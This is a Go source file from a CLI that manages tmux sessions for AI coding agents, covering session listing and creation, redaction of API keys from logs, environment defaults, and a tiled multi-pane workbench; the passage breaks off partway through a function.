/*
 * Copyright (c) 2026. AXIOM STUDIO AI Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package vibeflowcli

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"text/template"
	"unicode"
)

const sessionPrefix = "vibeflow_"

// TmuxManager handles tmux session lifecycle.
type TmuxManager struct {
	socketName    string
	supportsPopup bool // true if tmux >= 3.2 (display-popup support)
	logger        *Logger
}

// SetLogger attaches a logger to the TmuxManager for debug output.
func (tm *TmuxManager) SetLogger(l *Logger) {
	tm.logger = l
}

// NewTmuxManager creates a manager with an optional custom socket.
func NewTmuxManager(socketName string) *TmuxManager {
	if socketName == "" {
		socketName = "vibeflow"
	}
	tm := &TmuxManager{socketName: socketName}
	tm.supportsPopup = tm.detectPopupSupport()
	return tm
}

// detectPopupSupport checks if the installed tmux version supports
// display-popup (available since tmux 3.2).
func (tm *TmuxManager) detectPopupSupport() bool {
	out, err := exec.Command("tmux", "-V").CombinedOutput()
	if err != nil {
		return false
	}
	// Output format: "tmux 3.4" or "tmux next-3.5"
	version := strings.TrimSpace(string(out))
	version = strings.TrimPrefix(version, "tmux ")
	version = strings.TrimPrefix(version, "next-")
	parts := strings.SplitN(version, ".", 2)
	if len(parts) < 2 {
		return false
	}
	major, err1 := strconv.Atoi(parts[0])
	// Minor may contain suffixes like "2a", so just parse the leading digits.
	minorStr := parts[1]
	minor := 0
	for i, c := range minorStr {
		if c < '0' || c > '9' {
			minorStr = minorStr[:i]
			break
		}
	}
	minor, err2 := strconv.Atoi(minorStr)
	if err1 != nil || err2 != nil {
		return false
	}
	return major > 3 || (major == 3 && minor >= 2)
}

// TmuxSession represents a running tmux session.
type TmuxSession struct {
	Name      string
	ID        string
	Windows   int
	Attached  bool
	PaneDead  bool
	CreatedAt string
}

// SessionOpts holds parameters for creating a provider-aware tmux session.
type SessionOpts struct {
	Name     string            // Short session name (without prefix).
	Provider string            // Provider key (e.g. "claude", "codex").
	WorkDir  string            // Working directory for the session.
	Command  string            // Resolved launch command.
	Env      map[string]string // Provider-specific environment variables.
	Branch   string            // Git branch for status bar display.
	Project  string            // Project name for status bar display.
	Persona  string            // Persona key for vibeflow sessions.
}

// StatusBarOpts holds display parameters for the tmux status bar.
type StatusBarOpts struct {
	Provider string
	Branch   string
	Project  string
}

// LaunchTemplateVars are the variables available in a Provider's LaunchTemplate.
type LaunchTemplateVars struct {
	WorkDir         string
	Project         string
	Branch          string
	ServerURL       string
	SessionID       string
	SkipPermissions bool
	Model           string
	Binary          string // Resolved binary path (absolute or bare name).
}

// RenderLaunchCommand renders a provider's LaunchTemplate with the given vars.
// If the template is empty, the provider's binary name is returned as-is.
func RenderLaunchCommand(tmpl string, vars LaunchTemplateVars) (string, error) {
	if tmpl == "" {
		return "", nil
	}
	t, err := template.New("launch").Funcs(template.FuncMap{
		"shellQuote": shellQuote,
	}).Parse(tmpl)
	if err != nil {
		return "", fmt.Errorf("parse launch template: %w", err)
	}
	var buf bytes.Buffer
	if err := t.Execute(&buf, vars); err != nil {
		return "", fmt.Errorf("render launch template: %w", err)
	}
	return buf.String(), nil
}

// EnsureServer starts the tmux server on the configured socket if it is not
// already running. This allows the TUI and headless commands to list/create
// sessions without hitting "no server running" errors on the first call.
func (tm *TmuxManager) EnsureServer() error {
	_, err := tm.run("start-server")
	if err != nil {
		return err
	}
	// Configure server-level settings that aren't loaded from the user's
	// tmux.conf (since we use a custom socket). These enable clipboard
	// and terminal passthrough so Cmd+V paste works on macOS.
	for _, opt := range []struct{ key, val string }{
		{"set-clipboard", "on"},
		{"allow-passthrough", "on"},
	} {
		_, _ = tm.run("set", "-s", opt.key, opt.val)
	}
	// Enable mouse support so users can select and copy text with the
	// mouse. Without this, mouse selection is not available in tmux
	// sessions. Users can hold Shift (Linux) or Option (macOS) to
	// bypass tmux and use native terminal selection.
	_, _ = tm.run("set", "-g", "mouse", "on")
	// Keep dead panes alive so the user can see why the agent command
	// exited. Without this, sessions whose command exits immediately
	// are destroyed and disappear from the session list.
	_, _ = tm.run("set", "-g", "remain-on-exit", "on")
	return nil
}

// tmuxListDelim separates the fields ListSessions requests from tmux via the
// list-sessions -F format string. It MUST be a printable delimiter, never a
// control character: tmux sanitizes control characters (including TAB, 0x09)
// to '_' in list-sessions -F output whenever $TMUX is empty/unset — i.e. when
// vibeflow runs from a plain shell instead of inside a tmux client. A TAB
// delimiter therefore collapsed every row into a single field outside tmux, so
// ListSessions returned nothing and the CLI reported "No active sessions" (and
// the first-run wizard gate misfired) even with live sessions (issues #3490 /
// #3486).
//
// ":::" is collision-proof for the split-critical session_name field because
// tmux disallows ':' in session names, and no other emitted field — session_id
// ("$N"), the integer counts, or the created-time string's single ':' — ever
// contains three consecutive colons.
const tmuxListDelim = ":::"

// listSessionsFormat is the -F template for ListSessions, its fields joined by
// tmuxListDelim so the delimiter has a single source of truth shared by the
// request and the parser (parseTmuxSessionLines) — the two cannot drift apart.
var listSessionsFormat = strings.Join([]string{
	"#{session_name}",
	"#{session_id}",
	"#{session_windows}",
	"#{session_attached}",
	"#{session_created_string}",
	"#{pane_dead}",
}, tmuxListDelim)

// ListSessions returns all vibeflow-prefixed tmux sessions.
func (tm *TmuxManager) ListSessions() ([]TmuxSession, error) {
	out, err := tm.run("list-sessions", "-F", listSessionsFormat)
	if err != nil {
		// tmux writes error messages to combined output; err.Error() is just "exit status 1".
		combined := out + " " + err.Error()
		if strings.Contains(combined, "no server running") || strings.Contains(combined, "no sessions") {
			return nil, nil
		}
		return nil, fmt.Errorf("list sessions: %w", err)
	}
	return parseTmuxSessionLines(out), nil
}

// parseTmuxSessionLines parses the tmuxListDelim-delimited output of
// list-sessions -F into TmuxSession values, keeping only vibeflow-prefixed
// sessions. It is a standalone function so the split-critical parsing is unit
// testable without a running tmux server.
func parseTmuxSessionLines(out string) []TmuxSession {
	var sessions []TmuxSession
	for _, line := range strings.Split(strings.TrimSpace(out), "\n") {
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, tmuxListDelim, 6)
		if len(parts) < 5 {
			continue
		}
		name := parts[0]
		if !strings.HasPrefix(name, sessionPrefix) {
			continue
		}
		paneDead := len(parts) >= 6 && parts[5] == "1"
		sessions = append(sessions, TmuxSession{
			Name:      name,
			ID:        parts[1],
			Windows:   atoi(parts[2]),
			Attached:  parts[3] == "1",
			PaneDead:  paneDead,
			CreatedAt: parts[4],
		})
	}
	return sessions
}

// CreateSession creates a new tmux session running the given command.
// For provider-aware sessions, use CreateSessionWithOpts instead.
func (tm *TmuxManager) CreateSession(name, workDir, command string) error {
	return tm.CreateSessionWithOpts(SessionOpts{
		Name:    name,
		WorkDir: workDir,
		Command: command,
	})
}

// secretEnvPrefixes are env assignment prefixes ("KEY=" or a key-name prefix
// for dynamically-named keys) whose values must never reach the log file.
var secretEnvPrefixes = []string{
	"GEMINI_API_KEY=",
	"MCP_TOKEN=",
	"VIBEFLOW_TOKEN=",
	"GATEWAY_API_KEY=",
	"OPENAI_API_KEY=",
	"QWEN_CUSTOM_API_KEY",       // dynamic suffix encodes the endpoint; value is the key
	"ANTHROPIC_CUSTOM_HEADERS=", // gateway mode embeds the API token as "x-axiom-api-key: <token>"
	"ANTHROPIC_AUTH_TOKEN=",
	"ANTHROPIC_API_KEY=",
}

// openaiAPIKeyFlagRe matches `--openai-api-key <value>` (or `=<value>`) inside
// an assembled launch command, where <value> is either a sh-single-quoted
// token (including the `'\”` embedded-quote idiom) or a bare word.
var openaiAPIKeyFlagRe = regexp.MustCompile(`--openai-api-key[= ]('[^']*'(?:\\''[^']*')*|\S+)`)

// redactCommandSecrets masks API-key values embedded in a launch command
// string before it is logged (issue #1993: keys leaked at INFO level via the
// raw command). Commands without key flags are returned unchanged. Our own
// builders no longer emit `--openai-api-key`, but custom launch templates may.
func redactCommandSecrets(command string) string {
	return openaiAPIKeyFlagRe.ReplaceAllString(command, "--openai-api-key <redacted>")
}

// isSecretEnvKey reports whether the named env var carries a secret whose
// value must never be displayed or logged. Shares secretEnvPrefixes with
// spawn-arg redaction: "KEY="-style entries match the exact name, bare
// entries (dynamically-named keys) match as a name prefix.
func isSecretEnvKey(key string) bool {
	for _, p := range secretEnvPrefixes {
		if strings.HasPrefix(key+"=", p) {
			return true
		}
	}
	return false
}

// envAssignKeyRE matches a POSIX environment variable name — the "KEY" half of a
// "KEY=value" tmux -e assignment. The command-string arg and flags carry spaces,
// dashes, or quotes before their first '=', so they do NOT match and fall through
// to redactCommandSecrets rather than being treated as env assignments.
var envAssignKeyRE = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)

// redactSpawnArg redacts a single tmux spawn argument for logging. Deny-by-default:
// the value of ANY env assignment ("KEY=value" with KEY a valid env var name) is
// masked, so a provider token injected under a user-defined name — e.g. a Codex
// bearer_token_env_var, which no static allowlist can anticipate — can never leak
// to the debug log (issue #2714). The key name is preserved so support can still
// see which vars were set. Non-env args pass through redactCommandSecrets so any
// embedded key flags in the command argument are still masked.
func redactSpawnArg(a string) string {
	if key, _, ok := strings.Cut(a, "="); ok && envAssignKeyRE.MatchString(key) {
		return key + "=<redacted>"
	}
	return redactCommandSecrets(a)
}

// claudeHardeningEnv are Claude Code environment variables vibeflow sets on
// every launched `claude` session so autonomous / tmux-captured sessions stay
// quiet and stable: no mid-session auto-update, no telemetry / error reporting,
// no feedback survey, no non-essential model calls, and no alternate-screen
// buffer (which would break tmux capture and scrollback). Requested by the user
// (issue #3493). These are Claude-Code-specific and are applied only to the
// claude provider.
var claudeHardeningEnv = map[string]string{
	"DISABLE_AUTOUPDATER":                  "1", // no update checks/restarts mid-session
	"DISABLE_UPDATES":                      "1", // blocks all update paths incl. manual
	"DISABLE_TELEMETRY":                    "1", // Statsig opt-out
	"DISABLE_ERROR_REPORTING":              "1", // Sentry opt-out
	"CLAUDE_CODE_DISABLE_FEEDBACK_SURVEY":  "1", // no "How is Claude doing?" prompt
	"DISABLE_NON_ESSENTIAL_MODEL_CALLS":    "1", // skip non-critical API calls
	"CLAUDE_CODE_DISABLE_ALTERNATE_SCREEN": "1", // keep output in main scrollback
}

// withClaudeHardeningEnv returns the environment to apply to a session. For the
// claude provider it overlays claudeHardeningEnv as DEFAULTS onto env — a value
// already present in env for the same key is preserved, so explicit
// user / wizard / config values win. For every other provider env is returned
// unchanged. The input map is never mutated.
func withClaudeHardeningEnv(provider string, env map[string]string) map[string]string {
	if provider != "claude" {
		return env
	}
	merged := make(map[string]string, len(env)+len(claudeHardeningEnv))
	for k, v := range claudeHardeningEnv {
		merged[k] = v
	}
	for k, v := range env { // explicit caller values override the hardening defaults
		merged[k] = v
	}
	return merged
}

// CreateSessionWithOpts creates a tmux session with provider-specific
// options including environment variables and provider-prefixed naming.
func (tm *TmuxManager) CreateSessionWithOpts(opts SessionOpts) error {
	fullName := tm.FullSessionName(opts.Provider, opts.Name)

	// If a tmux session with the same name already exists, refuse to
	// overwrite it. Sessions must coexist — deletion is user-initiated only.
	if tm.HasSession(fullName) {
		return fmt.Errorf("session %q already exists — use 'vibeflow delete' to remove it first", fullName)
	}

	args := []string{"new-session", "-d", "-s", fullName, "-c", opts.WorkDir}

	// Set environment variables via tmux -e flags. For the claude provider this
	// also injects the claude hardening defaults (issue #3493).
	for k, v := range withClaudeHardeningEnv(opts.Provider, opts.Env) {
		// Expand ${VAR} references in values against the current environment.
		expanded := os.Expand(v, os.Getenv)
		args = append(args, "-e", fmt.Sprintf("%s=%s", k, expanded))
	}

	if opts.Command != "" {
		args = append(args, opts.Command)
	}

	// Log the full spawn command for debugging.
	if tm.logger != nil {
		// Build the full command line as it would appear in a shell.
		fullArgs := append([]string{"tmux", "-L", tm.socketName}, args...)
		// Redact secrets (env var values and in-command key flags) before logging.
		var redacted []string
		for _, a := range fullArgs {
			redacted = append(redacted, redactSpawnArg(a))
		}
		tm.logger.Debug("spawn %s: %s", opts.Provider, strings.Join(redacted, " "))
		tm.logger.Info("spawn session %q provider=%s workdir=%s command=%q", fullName, opts.Provider, opts.WorkDir, redactCommandSecrets(opts.Command))
	}

	_, err := tm.run(args...)
	if err != nil {
		return fmt.Errorf("create session %q: %w", fullName, err)
	}

	// Keep dead panes visible so the user can see why the agent exited.
	// Set per-session as well as globally in EnsureServer because the
	// global setting is lost when the server restarts (no prior sessions).
	_, _ = tm.run("set-option", "-t", fullName, "remain-on-exit", "on")

	// Configure vibeflow-themed status bar for this session.
	_ = tm.ConfigureStatusBar(fullName, StatusBarOpts{
		Provider: opts.Provider,
		Branch:   opts.Branch,
		Project:  opts.Project,
	})

	return nil
}

// FullSessionName returns the tmux session name with prefix and optional
// provider. Format: "vibeflow_{provider}-{name}" or "vibeflow_{name}".
func (tm *TmuxManager) FullSessionName(provider, name string) string {
	if provider != "" {
		return sessionPrefix + provider + "-" + name
	}
	return sessionPrefix + name
}

// InsideTmux reports whether the current process is running inside a tmux
// session (i.e. the $TMUX environment variable is set).
func InsideTmux() bool {
	return os.Getenv("TMUX") != ""
}

// AttachSession attaches to an existing tmux session.
// name can be either a short name (prefix is added) or a full tmux name
// (already prefixed with "vibeflow_").
func (tm *TmuxManager) AttachSession(name string) error {
	return tm.AttachSessionCmd(name).Run()
}

// AttachSessionCmd returns an *exec.Cmd that will attach to the named tmux
// session. The command has Stdin/Stdout/Stderr wired to os.Std*, ready for
// use with tea.ExecProcess.
// When running inside tmux, it uses switch-client instead of attach-session.
func (tm *TmuxManager) AttachSessionCmd(name string) *exec.Cmd {
	fullName := tm.ensurePrefix(name)
	var cmd *exec.Cmd
	if InsideTmux() {
		cmd = exec.Command("tmux", "-L", tm.socketName, "switch-client", "-t", fullName)
	} else {
		cmd = exec.Command("tmux", "-L", tm.socketName, "attach-session", "-t", fullName)
	}
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd
}

// KillSession kills a tmux session.
// name can be either a short name (prefix is added) or a full tmux name.
func (tm *TmuxManager) KillSession(name string) error {
	fullName := tm.ensurePrefix(name)
	_, err := tm.run("kill-session", "-t", fullName)
	return err
}

// FindSessionBySessionID searches running vibeflow tmux sessions for one
// whose name contains sessionID. Returns the full tmux session name or "".
func (tm *TmuxManager) FindSessionBySessionID(sessionID string) string {
	sessions, err := tm.ListSessions()
	if err != nil {
		return ""
	}
	for _, s := range sessions {
		if strings.Contains(s.Name, sessionID) {
			return s.Name
		}
	}
	return ""
}

// HasSession checks if a session exists.
// name can be either a short name (prefix is added) or a full tmux name.
func (tm *TmuxManager) HasSession(name string) bool {
	fullName := tm.ensurePrefix(name)
	_, err := tm.run("has-session", "-t", fullName)
	return err == nil
}

// ensurePrefix returns name with the session prefix, adding it only if
// not already present.
func (tm *TmuxManager) ensurePrefix(name string) string {
	if strings.HasPrefix(name, sessionPrefix) {
		return name
	}
	return sessionPrefix + name
}

// CapturePaneOutput returns the last N lines of output from a tmux session's pane.
// name can be a short name or a full tmux session name (prefix is added if needed).
func (tm *TmuxManager) CapturePaneOutput(name string, lines int) (string, error) {
	fullName := tm.ensurePrefix(name)
	startLine := fmt.Sprintf("-%d", lines)
	out, err := tm.run("capture-pane", "-p", "-t", fullName, "-S", startLine)
	if err != nil {
		return "", fmt.Errorf("capture-pane %q: %w", fullName, err)
	}
	return strings.TrimRight(out, "\n"), nil
}

// SendKeys sends keystrokes to a tmux session's active pane, as if the user
// typed them. An "Enter" key is appended automatically. This is the foundational
// primitive for programmatic input injection (e.g. error recovery prompts).
// name can be a short name or full tmux session name (prefix is added if needed).
func (tm *TmuxManager) SendKeys(name, keys string) error {
	if keys == "" {
		return nil
	}
	fullName := tm.ensurePrefix(name)
	if !tm.HasSession(fullName) {
		return fmt.Errorf("send-keys: session %q does not exist", fullName)
	}
	_, err := tm.run("send-keys", "-t", fullName, keys, "Enter")
	if err != nil {
		return fmt.Errorf("send-keys %q: %w", fullName, err)
	}
	return nil
}

// --- Native multi-session workbench (tmux pane-join composition) ---

// workbenchHolderName is the throwaway session that hosts the composed panes
// while the user is in the workbench. It is created on compose and destroyed on
// restore. The name carries the vibeflow prefix but has no provider dash, so it
// never collides with an agent session ("vibeflow_<provider>-<name>").
const workbenchHolderName = sessionPrefix + "workbench"

// isWorkbenchHolder reports whether a full tmux session name is the internal
// workbench composition holder rather than a user agent session. The holder is
// excluded from the TUI session list (#3300): otherwise it appears as
// "workbench" and, while a workbench is composed or orphaned, hides the agent
// sessions whose panes are joined into it.
func isWorkbenchHolder(fullName string) bool {
	return fullName == workbenchHolderName
}

// workbenchStatusKeys are the per-session status-bar options ConfigureStatusBar
// sets. They are captured before a session's pane is joined into the workbench
// and re-applied when the pane is restored, so the vibeflow-themed status bar
// survives the round trip (a recreated session would otherwise fall back to the
// default tmux status bar).
var workbenchStatusKeys = []string{
	"status", "status-style", "status-left", "status-right",
	"status-left-length", "status-right-length",
}

// workbenchSource records a session whose active pane was moved into the
// workbench holder, plus the state needed to return it to a session with the
// same name.
type workbenchSource struct {
	name   string            // original full tmux session name
	paneID string            // pane id, stable across join/break (e.g. "%4")
	status map[string]string // captured status-bar options to re-apply
}

// WorkbenchComposition is a live pane-join workbench. Restore returns every
// joined pane to its own session (by name) and tears down the holder.
type WorkbenchComposition struct {
	tm      *TmuxManager
	holder  string
	sources []workbenchSource
}

// HolderName returns the tmux session to attach to for the composed view.
func (c *WorkbenchComposition) HolderName() string { return c.holder }

// joinPaneArgs builds the tmux command that moves the src pane (or a session's
// active pane) into the dst window: join-pane -s src -t dst.
func joinPaneArgs(src, dst string) []string {
	return []string{"join-pane", "-s", src, "-t", dst}
}

// tiledLayoutArgs builds the tmux command that arranges the holder's panes in a
// tiled grid.
func tiledLayoutArgs(holder string) []string {
	return []string{"select-layout", "-t", holder, "tiled"}
}

// paneID returns the id of a session's active pane. The id is stable for the
// life of the pane, so it survives being joined into (and broken back out of)
// the workbench holder.
func (tm *TmuxManager) paneID(fullName string) (string, error) {
	out, err := tm.run("display-message", "-t", fullName, "-p", "#{pane_id}")
	if err != nil {
		return "", fmt.Errorf("pane id for %q: %w", fullName, err)
	}
	id := strings.TrimSpace(out)
	if id == "" {
		return "", fmt.Errorf("pane id for %q: empty", fullName)
	}
	return id, nil
}

// captureSessionStatus reads the per-session status-bar options so they can be
// re-applied after the session is recreated during Restore.
func (tm *TmuxManager) captureSessionStatus(fullName string) map[string]string {
	vals := make(map[string]string, len(workbenchStatusKeys))
	for _, k := range workbenchStatusKeys {
		out, err := tm.run("show-options", "-t", fullName, "-v", k)
		if err != nil {
			continue
		}
		if v := strings.TrimRight(out, "\n"); v != "" {
			vals[k] = v
		}
	}
	return vals
}

// applySessionStatus re-applies captured status-bar options to a session.
func (tm *TmuxManager) applySessionStatus(fullName string, vals map[string]string) {
	for _, k := range workbenchStatusKeys {
		if v, ok := vals[k]; ok {
			_, _ = tm.run("set-option", "-t", fullName, k, v)
		}
	}
}

// ComposeWorkbench joins the active pane of each named session into a single
// throwaway holder window arranged in a tiled grid, giving one natively
// interactive multi-pane view. Attach to the returned composition's HolderName
// for true interactivity, then call Restore to return every pane to its own
// session. At least two sessions are required (fewer has nothing to compose).
// join-pane MOVES a pane — the source session is consumed — so on any failure
// the panes already moved are restored before the error is returned, leaving no
// session stranded in the holder.
func (tm *TmuxManager) ComposeWorkbench(names []string, titles map[string]string) (*WorkbenchComposition, error) {
	full := make([]string, 0, len(names))
	for _, n := range names {
		full = append(full, tm.ensurePrefix(n))
	}
	if len(full) < 2 {
		return nil, fmt.Errorf("workbench needs at least 2 sessions, got %d", len(full))
	}

	holder := workbenchHolderName
	// A stale holder left by a previous crash would fail new-session; clear it.
	if tm.HasSession(holder) {
		_, _ = tm.run("kill-session", "-t", holder)
	}
	// Size the holder generously so early joins have room to split; tmux
	// resizes the window to the client on attach.
	if _, err := tm.run("new-session", "-d", "-s", holder, "-x", "250", "-y", "50"); err != nil {
		return nil, fmt.Errorf("create workbench holder: %w", err)
	}
	placeholder, err := tm.paneID(holder)
	if err != nil {
		_, _ = tm.run("kill-session", "-t", holder)
		return nil, err
	}

	comp := &WorkbenchComposition{tm: tm, holder: holder}
	if err := tm.composeInto(holder, full, titles, comp); err != nil {
		comp.Restore()
		return nil, err
	}

	// Drop the holder's original shell pane so only agent panes remain, then
	// tile them into a grid and add the bordered chrome + shortcut hint.
	_, _ = tm.run("kill-pane", "-t", placeholder)
	_, _ = tm.run(tiledLayoutArgs(holder)...)
	tm.configureWorkbenchChrome(holder, workbenchHintSingle)
	return comp, nil
}

// Keyboard-shortcut hints shown in the workbench status bar. Both advertise
// "Ctrl-t: switch session" — Ctrl-t cycles between session panes (bound by
// bindWorkbenchNavKeys). A plain control key is emitted by every terminal,
// unlike Ctrl+arrow which many terminals don't send (#3293); earlier "Ctrl-b o"
// was unreliable and Ctrl-o is used by coding agents. The multi-project hint
// additionally advertises Ctrl-b n/p for cycling projects.
const (
	workbenchHintSingle = "  Ctrl-t: switch session   |   Ctrl-q or Ctrl-b d: back to menu  "
	workbenchHintMulti  = "  Ctrl-t: switch session   |   Ctrl-b n / Ctrl-b p: next / prev project   |   Ctrl-q or Ctrl-b d: back to menu  "
)

// WorkbenchProject is a named group of sessions (one project / working
// directory) composed into a single workbench window by ComposeProjectWorkbench.
type WorkbenchProject struct {
	Label    string   // short project label for the window name / border
	Sessions []string // tmux session names in this project
}

// sanitizeWorkbenchTitle strips terminal-escape / control characters from a
// workbench pane header before it is handed to tmux (#3286, defense-in-depth).
// Persona/Project/Branch can originate from server session JSON, so a crafted
// value could embed escape sequences; tmux filters control chars in border
// titles today, but this closes the gap for any future path that renders them
// raw. Keeps only printable runes (drops C0/C1 controls, ESC, OSC intro, DEL —
// unicode.IsPrint covers all of these) and clamps the length. Space and the "·"
// separator are printable and preserved.
func sanitizeWorkbenchTitle(s string) string {
	const maxRunes = 80
	var b strings.Builder
	n := 0
	for _, r := range s {
		if n >= maxRunes {
			break
		}
		if !unicode.IsPrint(r) {
			continue
		}
		b.WriteRune(r)
		n++
	}
	return b.String()
}

// workbenchPaneTitle is the short label shown on a pane's border in the
// workbench — the session name without the vibeflow_ prefix. Used as the
// fallback header when no persona/project/branch metadata is available.
func workbenchPaneTitle(fullName string) string {
	return sanitizeWorkbenchTitle(strings.TrimPrefix(fullName, sessionPrefix))
}

// workbenchHeader builds the per-pane border label shown in the workbench:
// "persona · project · branch", omitting any component that is empty so a
// session missing (say) a persona still renders a clean "project · branch"
// label. Returns "" when all three are empty, letting the caller fall back to
// workbenchPaneTitle. Each (server-influenced) component is sanitized of
// terminal-escape/control characters before joining (#3286).
func workbenchHeader(persona, project, branch string) string {
	parts := make([]string, 0, 3)
	for _, p := range []string{persona, project, branch} {
		if s := sanitizeWorkbenchTitle(strings.TrimSpace(p)); s != "" {
			parts = append(parts, s)
		}
	}
	return strings.Join(parts, " · ")
}

// composeInto joins the active pane of each session into the target window (a
// session or "session:window"/window-id spec), tiling after every join so the
// next join has room — a small holder otherwise hits tmux's "create pane
// failed: pane too small" after a few default 50/50 join-pane splits (issue
// #3280). Each pane gets its own titled border: the dim/active border styles
// visibly delineate every session window, and the top border carries the
// header. titles maps a full tmux session name to its "persona · project ·
// branch" header; a session absent from the map (or with an empty header)
// falls back to workbenchPaneTitle. Sources are appended to comp so Restore
// can return every pane to its own session.
func (tm *TmuxManager) composeInto(target string, sessions []string, titles map[string]string, comp *WorkbenchComposition) error {
	tm.configureWorkbenchBorders(target)
	for _, name := range sessions {
		full := tm.ensurePrefix(name)
		pid, err := tm.paneID(full)
		if err != nil {
			return err
		}
		status := tm.captureSessionStatus(full)
		if out, err := tm.run(joinPaneArgs(full, target)...); err != nil {
			return fmt.Errorf("join %q into workbench: %w: %s", full, err, strings.TrimSpace(out))
		}
		title := workbenchPaneTitle(full)
		if h := titles[full]; h != "" {
			title = h
		}
		// Store the header in the pane-scoped user option @vfheader (see
		// configureWorkbenchBorders) so the running agent's OSC pane-title
		// writes cannot overwrite it.
		_, _ = tm.run("set-option", "-p", "-t", pid, "@vfheader", title)
		comp.sources = append(comp.sources, workbenchSource{name: full, paneID: pid, status: status})
		_, _ = tm.run(tiledLayoutArgs(target)...)
	}
	return nil
}

// configureWorkbenchBorders enables a labeled top border on every pane of the
// target window and colors the borders so each session window is visibly its
// own bordered box (dim for inactive panes, highlighted for the focused one).
// The header is rendered from the pane-scoped user option @vfheader (set by
// composeInto), NOT #{pane_title}: a running agent emits OSC terminal-title
// escape sequences that overwrite pane_title, which would clobber our header —
// tmux user options are immune to that.
func (tm *TmuxManager) configureWorkbenchBorders(target string) {
	for _, opt := range []struct{ key, val string }{
		{"pane-border-status", "top"},
		{"pane-border-format", " #{@vfheader} "},
		// Heavy border lines + a lighter backdrop on the active pane give each
		// session window a distinct box. tmux has no true pane gap/margin, so
		// this is the closest achievable to "spacing between panes" (#2721,
		// user-chosen Option A). window-style styles inactive panes;
		// window-active-style the focused one.
		{"pane-border-lines", "heavy"},
		{"pane-border-style", "fg=" + oceanHexMuted},
		{"pane-active-border-style", "fg=" + oceanHexPrimary},
		{"window-style", "bg=" + oceanHexBackground},
		{"window-active-style", "bg=" + oceanHexShallow},
	} {
		_, _ = tm.run("set-option", "-t", target, opt.key, opt.val)
	}
}

// configureWorkbenchChrome sets a single-line status bar on the holder carrying
// the given keyboard-shortcut hint, so the workbench shows its controls. The
// per-project window tabs remain visible in the status bar's window list.
func (tm *TmuxManager) configureWorkbenchChrome(holder, hint string) {
	for _, opt := range []struct{ key, val string }{
		{"status", "on"},
		// Status line at the TOP so it occupies row 0 and the pane grid starts on
		// row 1. With pane-border-status=top the top-row panes' header would
		// otherwise sit on the window's very first row, which VS Code's terminal
		// clips — pushing everything down one row makes those headers visible
		// (#3299); lower panes are unaffected.
		{"status-position", "top"},
		{"status-style", "fg=" + oceanHexForeground + ",bg=" + oceanHexBackground},
		{"status-left-length", "220"},
		{"status-left", hint},
		{"status-right", ""},
	} {
		_, _ = tm.run("set-option", "-t", holder, opt.key, opt.val)
	}
	tm.bindWorkbenchNavKeys()
}

// bindWorkbenchNavKeys installs the workbench's root-table mouse/keyboard
// ergonomics: Ctrl-t to switch panes, and a MouseDown1Pane override so a single
// click focuses the pane under the pointer. Both are guarded by pane count so
// single-pane windows (a directly-attached agent) keep tmux's default
// pass-through behavior. Root-table bindings are global to the tmux server (same
// table BindSessionKeys uses); re-binding is idempotent.
func (tm *TmuxManager) bindWorkbenchNavKeys() {
	// Ctrl-t cycles to the next session pane in a multi-pane workbench window. A
	// plain control key is emitted reliably by every terminal, unlike Ctrl+arrow
	// which many terminals (notably on macOS) don't send at all — so no tmux-side
	// config could make the arrow bindings fire (#3293, user-chosen). The
	// if-shell guard scopes it to multi-pane windows: a single-pane window (a
	// directly-attached agent) passes Ctrl-t through to the agent via send-keys
	// instead of capturing it.
	_, _ = tm.run("bind-key", "-T", "root", "C-t",
		"if-shell", "-F", "#{>:#{window_panes},1}",
		"select-pane -t :.+", "send-keys C-t")

	// MouseDown1Pane: in a multi-pane workbench, a single left click just SELECTS
	// the pane under the pointer — it deliberately drops tmux's default `send -M`
	// pass-through, which forwards the click to the agent app and is what made
	// focus feel like it took several clicks (#3321, user-chosen: click-to-focus
	// is the priority and copy/paste is not). tmux's default MouseDown1Pane is
	// `select-pane -t= ; send -M`. Single-pane windows keep the pass-through
	// (`send-keys -M`) so a directly-attached agent still receives the mouse.
	// Drag-to-copy (MouseDrag1Pane) is a separate binding and is unaffected.
	_, _ = tm.run("bind-key", "-T", "root", "MouseDown1Pane",
		"if-shell", "-F", "#{>:#{window_panes},1}",
		"select-pane -t=", "send-keys -M")
}

// windowID returns the tmux window id (e.g. "@3") for a window target.
func (tm *TmuxManager) windowID(target string) (string, error) {
	out, err := tm.run("display-message", "-t", target, "-p", "#{window_id}")
	if err != nil {
		return "", fmt.Errorf("window id for %q: %w", target, err)
	}
	id := strings.TrimSpace(out)
	if id == "" {
		return "", fmt.Errorf("window id for %q: empty", target)
	}
	return id, nil
}

// ComposeProjectWorkbench builds a multi-project workbench: one holder window
// per project (window name = project label; panes = that project's sessions,
// tiled + bordered), then selects the window whose label == selectLabel. The
// caller attaches to HolderName; Ctrl-b n/p cycles projects natively, and
// Restore returns every pane across every window to its own session. At least
// two sessions total are required. On any failure the panes already composed
// are restored before the error is returned.
func (tm *TmuxManager) ComposeProjectWorkbench(projects []WorkbenchProject, selectLabel string, titles map[string]string) (*WorkbenchComposition, error) {
	total := 0
	for _, p := range projects {
		total += len(p.Sessions)
	}
	if total < 2 {
		return nil, fmt.Errorf("workbench needs at least 2 sessions, got %d", total)
	}

	holder := workbenchHolderName
	if tm.HasSession(holder) {
		_, _ = tm.run("kill-session", "-t", holder)
	}
	if _, err := tm.run("new-session", "-d", "-s", holder, "-x", "250", "-y", "50"); err != nil {
		return nil, fmt.Errorf("create workbench holder: %w", err)
	}

	comp := &WorkbenchComposition{tm: tm, holder: holder}
	selectTarget := ""
	first := true
	for _, p := range projects {
		if len(p.Sessions) == 0 {
			continue
		}
		var win string
		if first {
			// Reuse the holder's initial window for the first project.
			id, err := tm.windowID(holder + ":0")
			if err != nil {
				comp.Restore()
				return nil, err
			}
			win = id
			_, _ = tm.run("rename-window", "-t", win, p.Label)
			first = false
		} else {
			out, err := tm.run("new-window", "-d", "-P", "-F", "#{window_id}", "-t", holder, "-n", p.Label)
